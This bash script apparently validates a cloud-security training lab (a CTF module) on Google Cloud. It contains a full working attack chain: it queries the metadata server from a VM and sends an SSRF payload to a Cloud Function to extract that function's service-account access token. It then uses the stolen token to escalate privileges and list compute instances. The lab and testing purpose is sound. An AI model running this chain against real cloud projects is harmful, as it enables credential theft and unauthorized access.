#!/bin/bash
#
# validate-m3.sh - Module 3 validation script
# This script validates the infrastructure setup and exploit path for Module 3
# Must be run from local environment with gcloud access to the project

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Counters
PASSED=0
FAILED=0

# Helper functions
print_step() {
    echo -e "\n${BLUE}[STEP]${NC} $1"
}

print_pass() {
    echo -e "${GREEN}[PASS]${NC} $1"
    PASSED=$((PASSED + 1))
}

print_fail() {
    echo -e "${RED}[FAIL]${NC} $1"
    FAILED=$((FAILED + 1))
}

print_info() {
    echo -e "${YELLOW}[INFO]${NC} $1"
}

# Function to execute commands on the VM using SSH key from Module 2
exec_on_vm() {
    local cmd="$1"
    local val_test_dir="./val-test"
    local ssh_key_file="$val_test_dir/ssh_key"
    local vm_ip_file="$val_test_dir/vm_ip.txt"
    
    # Check if required files exist
    if [ ! -f "$ssh_key_file" ]; then
        echo "ERROR: SSH key not found at $ssh_key_file" >&2
        echo "Please run validate-m2.sh first" >&2
        return 1
    fi
    
    if [ ! -f "$vm_ip_file" ]; then
        echo "ERROR: VM IP file not found at $vm_ip_file" >&2
        echo "Please run validate-m2.sh first" >&2
        return 1
    fi
    
    local vm_ip=$(cat "$vm_ip_file")
    
    # Execute command via SSH
    ssh -i "$ssh_key_file" -o StrictHostKeyChecking=no -o ConnectTimeout=10 "alice@$vm_ip" "$cmd"
    return $?
}

echo "====================================="
echo "Module 3 Validation"
echo "====================================="

# Step 1: Environment validation
print_step "Validating environment setup..."

if [ -z "${PROJECT_ID:-}" ]; then
    print_fail "PROJECT_ID is not set"
    echo "Please run: export PROJECT_ID=<your-project-id>"
    exit 1
else
    print_pass "PROJECT_ID is set: $PROJECT_ID"
fi

if [ -z "${LOCATION:-}" ]; then
    print_fail "LOCATION is not set"
    echo "Please run: export LOCATION=us-east1"
    exit 1
else
    print_pass "LOCATION is set: $LOCATION"
fi

# Check for required commands
if command -v gcloud >/dev/null; then
    print_pass "gcloud is available"
else
    print_fail "gcloud command not found"
    exit 1
fi

if command -v gsutil >/dev/null; then
    print_pass "gsutil is available"
else
    print_fail "gsutil command not found"
    exit 1
fi

# Check that validation test directory exists
VAL_TEST_DIR="./val-test"
if [ ! -d "$VAL_TEST_DIR" ]; then
    print_fail "Validation test directory $VAL_TEST_DIR does not exist"
    echo "Please run validate-m2.sh first to create the required files"
    exit 1
fi

# Verify student-workshop permissions (using current validation config)
print_step "Verifying permission restrictions..."

# Test 1: Verify CANNOT access cloud-function-bucket-module3 with current permissions
print_info "Testing bucket access restrictions..."
GSUTIL_TEST_STDERR=$(mktemp)
GSUTIL_TEST_STDOUT=$(mktemp)
gsutil ls "gs://cloud-function-bucket-module3-$PROJECT_ID/" >"$GSUTIL_TEST_STDOUT" 2>"$GSUTIL_TEST_STDERR"
GSUTIL_TEST_EXIT=$?
if [ $GSUTIL_TEST_EXIT -eq 0 ]; then
    print_fail "Current account CAN access cloud-function-bucket-module3 (should be denied)"
    FAILED=$((FAILED + 1))
else
    print_pass "Current account correctly denied access to cloud-function-bucket-module3"
    PASSED=$((PASSED + 1))
fi
rm -f "$GSUTIL_TEST_STDOUT" "$GSUTIL_TEST_STDERR"

# Test 2: Verify CANNOT list cloud functions
print_info "Testing cloud functions restrictions..."
FUNCTIONS_TEST_STDERR=$(mktemp)
FUNCTIONS_TEST_STDOUT=$(mktemp)
gcloud functions list --region="$LOCATION" >"$FUNCTIONS_TEST_STDOUT" 2>"$FUNCTIONS_TEST_STDERR"
FUNCTIONS_TEST_EXIT=$?
if [ $FUNCTIONS_TEST_EXIT -eq 0 ]; then
    print_fail "Current account CAN list cloud functions (should be denied)"
    FAILED=$((FAILED + 1))
else
    print_pass "Current account correctly denied listing cloud functions"
    PASSED=$((PASSED + 1))
fi
rm -f "$FUNCTIONS_TEST_STDOUT" "$FUNCTIONS_TEST_STDERR"

# Step 2: Test VM connectivity
print_step "Testing VM connectivity..."

# Read VM IP from Module 2's output
VM_IP_FILE="$VAL_TEST_DIR/vm_ip.txt"
if [ ! -f "$VM_IP_FILE" ]; then
    print_fail "VM IP file not found at $VM_IP_FILE"
    echo "Please run validate-m2.sh first"
    exit 1
fi
VM_IP=$(cat "$VM_IP_FILE")
print_pass "Using VM IP from Module 2: $VM_IP"

# Test SSH connectivity
print_info "Testing SSH connection to VM..."
if exec_on_vm "echo 'SSH connection successful'" | grep -q "SSH connection successful"; then
    print_pass "Successfully connected to VM via SSH"
else
    print_fail "Cannot connect to VM via SSH"
    echo "Please ensure you have SSH access to the VM"
    exit 1
fi

# Step 3: Check VM service account
print_step "Checking VM service account..."

VM_SA_STDERR=$(mktemp)
VM_SERVICE_ACCOUNT=$(exec_on_vm "gcloud auth list --filter=status:ACTIVE --format='value(account)' | head -1")
if [ -s "$VM_SA_STDERR" ]; then
    print_info "Service account retrieval stderr:"
    cat "$VM_SA_STDERR"
fi
rm -f "$VM_SA_STDERR"

if [ -z "$VM_SERVICE_ACCOUNT" ]; then
    print_fail "Could not retrieve service account from VM"
elif [[ "$VM_SERVICE_ACCOUNT" =~ ^[0-9]+-compute@developer\.gserviceaccount\.com$ ]]; then
    print_pass "VM using correct compute service account: $VM_SERVICE_ACCOUNT"
else
    print_fail "VM using unexpected service account: $VM_SERVICE_ACCOUNT"
    print_info "Expected format: <project-number>-compute@developer.gserviceaccount.com"
fi

# Step 4: Test metadata server access from VM
print_step "Testing metadata server access..."

print_info "Querying metadata server for service account information..."
METADATA_OUTPUT=$(exec_on_vm "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/'")

if echo "$METADATA_OUTPUT" | grep -q "aliases\|email\|scopes"; then
    print_pass "VM can access metadata server"
    print_info "Available metadata endpoints: $(echo "$METADATA_OUTPUT" | tr '\n' ' ')"
else
    print_fail "VM cannot access metadata server properly"
    print_info "Output: $(echo "$METADATA_OUTPUT" | head -1)"
fi

# Test email endpoint specifically
EMAIL_OUTPUT=$(exec_on_vm "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'")
if [[ "$EMAIL_OUTPUT" =~ @developer\.gserviceaccount\.com ]]; then
    print_pass "Can retrieve service account email from metadata: $EMAIL_OUTPUT"
else
    print_fail "Cannot retrieve service account email from metadata"
fi

# Step 5: Test OAuth scope limitations from VM
print_step "Testing OAuth scope limitations..."

print_info "Checking if VM can list compute instances (should fail)..."
COMPUTE_OUTPUT=$(exec_on_vm "gcloud compute instances list 2>&1")

if echo "$COMPUTE_OUTPUT" | grep -q "Request had insufficient authentication scopes\|insufficient OAuth scopes"; then
    print_pass "Compute API access correctly denied due to insufficient scopes"
else
    print_fail "Expected OAuth scope error but got different result"
    print_info "Output: $(echo "$COMPUTE_OUTPUT" | head -1)"
fi

# Step 6: Check OAuth scopes on VM
print_step "Verifying VM OAuth scopes..."

print_info "Getting access token from VM..."
print_info "Checking OAuth scopes..."

# Debug the exact command being run
print_info "Running OAuth scope check command on VM..."
OAUTH_CMD='curl -s https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$(gcloud auth print-access-token) 2>&1'
print_info "Command: $OAUTH_CMD"

# Execute with explicit error capturing
SCOPE_OUTPUT=$(exec_on_vm "$OAUTH_CMD")
OAUTH_EXIT=$?
if [ $OAUTH_EXIT -ne 0 ]; then
    print_fail "Failed to execute OAuth scope check on VM"
    print_info "Error output: $SCOPE_OUTPUT"
    exit 1
fi

print_info "Raw OAuth response: $(echo "$SCOPE_OUTPUT" | head -c 500)"

# Extract scopes - check if grep finds anything
SCOPES=$(echo "$SCOPE_OUTPUT" | grep -o '"scope":"[^"]*"' | cut -d'"' -f4)
if [ $? -ne 0 ] || [ -z "$SCOPES" ]; then
    print_info "No scopes found in response using primary method"
    SCOPES=""
fi

if [ -n "$SCOPES" ] && echo "$SCOPES" | grep -q "devstorage.read_only"; then
    print_pass "VM has expected devstorage.read_only scope"
    print_info "VM OAuth scopes: $SCOPES"
else
    # Fallback check with different pattern
    if echo "$SCOPE_OUTPUT" | grep -q "devstorage.read_only"; then
        print_pass "VM has expected devstorage.read_only scope (found via fallback)"
    else
        print_fail "VM missing expected devstorage.read_only scope"
        print_info "Full debug output: $SCOPE_OUTPUT"
    fi
fi

# Step 7: Test storage access from VM
print_step "Testing storage bucket access from VM..."

BUCKET_STDERR=$(mktemp)
BUCKET_OUTPUT=$(exec_on_vm "gsutil ls")
if [ -s "$BUCKET_STDERR" ]; then
    print_info "Bucket listing stderr (may contain warnings):"
    cat "$BUCKET_STDERR"
fi
rm -f "$BUCKET_STDERR"

if echo "$BUCKET_OUTPUT" | grep -q "cloud-function-bucket-module3"; then
    print_pass "VM can list cloud function bucket"
    BUCKET_NAME=$(echo "$BUCKET_OUTPUT" | grep "cloud-function-bucket-module3" | head -1)
    print_info "Found bucket: $BUCKET_NAME"
else
    print_fail "VM cannot find cloud-function-bucket-module3"
fi

# Step 8: Check function source access from VM
print_step "Checking function source code access..."

SOURCE_STDERR=$(mktemp)
SOURCE_OUTPUT=$(exec_on_vm "gsutil ls gs://cloud-function-bucket-module3-$PROJECT_ID/")
if [ -s "$SOURCE_STDERR" ]; then
    print_info "Source listing stderr:"
    cat "$SOURCE_STDERR"
fi
rm -f "$SOURCE_STDERR"

if echo "$SOURCE_OUTPUT" | grep -q "main.py"; then
    print_pass "VM can access function source code (main.py)"
    
    # Check if we can read the source file
    LS_L_STDERR=$(mktemp)
    LS_L_OUTPUT=$(exec_on_vm "gsutil ls -L gs://cloud-function-bucket-module3-$PROJECT_ID/main.py")
    if [ -s "$LS_L_STDERR" ]; then
        print_info "Source file detail stderr:"
        cat "$LS_L_STDERR"
    fi
    rm -f "$LS_L_STDERR"
    
    if echo "$LS_L_OUTPUT" | grep -q "Content-Length"; then
        print_pass "VM has read access to function source code"
    else
        print_fail "VM cannot read function source code"
    fi
else
    print_fail "VM cannot find function source files (main.py)"
    print_info "Available files: $(echo "$SOURCE_OUTPUT" | tr '\n' ' ')"
fi

# Step 9: Read and validate function source code
print_step "Reading and validating function source code..."

if echo "$SOURCE_OUTPUT" | grep -q "main.py"; then
    print_info "Attempting to read main.py from bucket..."
    CAT_STDERR=$(mktemp)
    SOURCE_CODE=$(exec_on_vm "gsutil cat gs://cloud-function-bucket-module3-$PROJECT_ID/main.py")
    if [ -s "$CAT_STDERR" ]; then
        print_info "Source code read stderr:"
        cat "$CAT_STDERR"
    fi
    rm -f "$CAT_STDERR"
    
    if [ -n "$SOURCE_CODE" ]; then
        # Check for key vulnerable code patterns
        if echo "$SOURCE_CODE" | grep -q "metadata.google.internal"; then
            print_pass "Found metadata server access in function code"
            
            if echo "$SOURCE_CODE" | grep -q 'request_json\["metadata"\]'; then
                print_pass "Function accepts user-controlled metadata parameter"
                print_info "This is the SSRF vulnerability - user can control metadata endpoint"
            else
                print_fail "Could not identify user-controlled metadata parameter"
            fi
            
            if echo "$SOURCE_CODE" | grep -q "flag4"; then
                print_pass "Flag 4 is present in function code"
            else
                print_fail "Flag 4 not found in function code"
            fi
            
            # Show vulnerable code snippet
            print_info "Vulnerable code pattern identified:"
            VULN_CODE=$(echo "$SOURCE_CODE" | grep -A3 -B3 "metadata.google.internal" | head -10)
            echo "$VULN_CODE" | while IFS= read -r line; do
                echo "    $line"
            done
        else
            print_fail "Function code does not contain expected metadata server access"
        fi
    else
        print_fail "Could not read function source code from bucket"
    fi
else
    print_info "Skipping source code validation - main.py not found in bucket"
fi

# Step 10: Check invocation script on VM
print_step "Checking function invocation script..."

if exec_on_vm "test -f ./invoke_monitoring_function.sh"; then
    print_pass "Invocation script found on VM"
    
    # Test the script
    print_info "Testing invocation script execution..."
    INVOKE_TEST=$(exec_on_vm "export LOCATION=$LOCATION PROJECT_ID=$PROJECT_ID && bash ./invoke_monitoring_function.sh")
    
    if echo "$INVOKE_TEST" | grep -q "function_account"; then
        print_pass "Invocation script successfully calls cloud function"
        if echo "$INVOKE_TEST" | grep -q "@developer.gserviceaccount.com"; then
            print_info "Function returns service account info"
        fi
    else
        print_fail "Invocation script didn't return expected output"
        print_info "Got: $(echo "$INVOKE_TEST" | head -1)"
    fi
else
    print_fail "Invocation script not found on VM"
    print_info "You may need to copy it using scp with the SSH key from Module 2"
fi

# Step 11: Test SSRF exploitation
print_step "Testing SSRF exploitation for privilege escalation..."

print_info "Attempting to extract token via SSRF vulnerability..."

# Get Gen2 function URL - try from VM first, then fallback methods
print_info "Getting monitoring function URL..."

# Method 1: Check if URL is stored on VM from setup
FUNCTION_URL=$(exec_on_vm "test -f /home/alice/.function_url && cat /home/alice/.function_url" 2>/dev/null)

if [ -z "$FUNCTION_URL" ]; then
    # Method 2: Extract from invoke_monitoring_function.sh output
    print_info "URL file not found on VM, extracting from invocation script output..."
    INVOKE_OUTPUT=$(exec_on_vm "export LOCATION=$LOCATION PROJECT_ID=$PROJECT_ID && bash ./invoke_monitoring_function.sh 2>&1")
    FUNCTION_URL=$(echo "$INVOKE_OUTPUT" | grep "^Function URL:" | sed 's/^Function URL: //')
fi

if [ -z "$FUNCTION_URL" ]; then
    print_fail "Could not retrieve monitoring function URL from VM"
    print_info "The function URL should be stored in /home/alice/.function_url during setup"
    exit 1
fi

print_info "Using function URL: $FUNCTION_URL"

# Execute the SSRF attack from VM
# First get the identity token
print_info "Getting identity token from VM..."
ID_TOKEN=$(exec_on_vm "gcloud auth print-identity-token")

# Then use it in the curl command
SSRF_CMD="curl -s -X POST '$FUNCTION_URL' \
-H 'Authorization: Bearer $ID_TOKEN' \
-H 'Content-Type: application/json' \
-d '{\"metadata\": \"token\"}'"

SSRF_STDERR=$(mktemp)
SSRF_RESPONSE=$(exec_on_vm "$SSRF_CMD" 2>"$SSRF_STDERR")
if [ -s "$SSRF_STDERR" ]; then
    print_info "SSRF command stderr:"
    cat "$SSRF_STDERR"
fi
rm -f "$SSRF_STDERR"

# Check for flag
if echo "$SSRF_RESPONSE" | grep -q "flag4"; then
    print_pass "Flag 4 found! SSRF exploitation successful"
else
    print_fail "Flag 4 not found in SSRF response"
fi

# Check for token extraction
if echo "$SSRF_RESPONSE" | grep -q "function_account"; then
    print_pass "Access token exposed via SSRF vulnerability"
    print_info "Function's service account token is accessible"
    
    # Extract the token from the response - handle nested JSON
    # The function_account field contains an escaped JSON string
    # First extract everything between "function_account": " and the next unescaped quote
    FUNCTION_ACCOUNT=$(echo "$SSRF_RESPONSE" | sed -n 's/.*"function_account": "\(.*\)".*/\1/p' | head -1)
    
    # The function_account contains escaped JSON, so we need to unescape and parse it
    # First unescape the JSON (replace \" with "), then extract the access_token
    EXTRACTED_TOKEN=$(echo "$FUNCTION_ACCOUNT" | sed 's/\\"/"/g' | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
    
    # If the first method didn't work and jq is available, try using jq for more robust parsing
    if [ -z "$EXTRACTED_TOKEN" ]; then
        if command -v jq >/dev/null; then
            print_info "Attempting JSON parsing with jq..."
            JQ_STDERR=$(mktemp)
            EXTRACTED_TOKEN=$(echo "$SSRF_RESPONSE" | jq -r '.function_account' 2>"$JQ_STDERR" | jq -r '.access_token' 2>>"$JQ_STDERR")
            if [ -s "$JQ_STDERR" ]; then
                print_info "jq parsing stderr:"
                cat "$JQ_STDERR"
            fi
            rm -f "$JQ_STDERR"
        fi
    fi
    
    if [ -n "$EXTRACTED_TOKEN" ]; then
        print_info "Validating extracted token's permissions..."
        
        # Check the extracted token's scopes
        TOKEN_STDERR=$(mktemp)
        TOKEN_INFO=$(exec_on_vm "curl -s \"https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=${EXTRACTED_TOKEN}\"")
        if [ -s "$TOKEN_STDERR" ]; then
            print_info "Token info stderr:"
            cat "$TOKEN_STDERR"
        fi
        rm -f "$TOKEN_STDERR"
        
        if echo "$TOKEN_INFO" | grep -q "cloud-platform"; then
            print_pass "Extracted token has cloud-platform scope (full GCP access)!"
            print_info "This demonstrates successful privilege escalation from limited VM scope"
            
            # List the scopes for comparison
            JQ_STDERR2=$(mktemp)
            FUNCTION_SCOPES=$(echo "$TOKEN_INFO" | jq -r '.scope' 2>"$JQ_STDERR2")
            if [ $? -ne 0 ] || [ -z "$FUNCTION_SCOPES" ]; then
                FUNCTION_SCOPES=$(echo "$TOKEN_INFO" | grep -o '"scope": "[^"]*"' | cut -d'"' -f4)
            fi
            rm -f "$JQ_STDERR2"
            print_info "Function token scopes: $FUNCTION_SCOPES"
            
            # Test that the new token can do things the VM token cannot
            print_info "Testing privilege escalation - attempting to list compute instances with function token..."
            COMPUTE_TEST=$(exec_on_vm "export CLOUDSDK_AUTH_ACCESS_TOKEN=\"${EXTRACTED_TOKEN}\" && gcloud compute instances list --limit=1 2>&1")
            
            if echo "$COMPUTE_TEST" | grep -q "NAME\|ZONE\|MACHINE_TYPE"; then
                print_pass "Function token can list compute instances (VM token cannot)!"
                echo "$EXTRACTED_TOKEN" > "${VAL_TEST_DIR}/function_token.txt"
            else
                print_info "Could not verify compute access with function token"
            fi
        else
            print_fail "Extracted token does not have expected cloud-platform scope"
            print_info "Token scopes: $(echo "$TOKEN_INFO" | grep scope)"
        fi
    else
        print_fail "Could not parse access token from response"
    fi
else
    print_fail "Could not extract access token via SSRF"
    print_info "Response preview: $(echo "$SSRF_RESPONSE" | head -c 200)..."
    
    # Additional debugging
    if echo "$SSRF_RESPONSE" | grep -q "401 Unauthor"; then
        print_info "Got 401 Unauthorized - check that VM service account has run.invoker role"
    elif echo "$SSRF_RESPONSE" | grep -q "404"; then
        print_info "Got 404 - check function URL is correct"
    fi
fi

# Summary
echo
echo "====================================="
echo "Validation Summary"
echo "====================================="
echo -e "${GREEN}Passed:${NC} $PASSED"
echo -e "${RED}Failed:${NC} $FAILED"
echo

if [ $FAILED -eq 0 ]; then
    echo -e "${GREEN}✓ All validation checks passed!${NC}"
    echo "The infrastructure is correctly set up for Module 3."
    exit 0
else
    echo -e "${RED}✗ Some validation checks failed.${NC}"
    echo "Please review the errors above and ensure the infrastructure is properly deployed."
    exit 1
fi
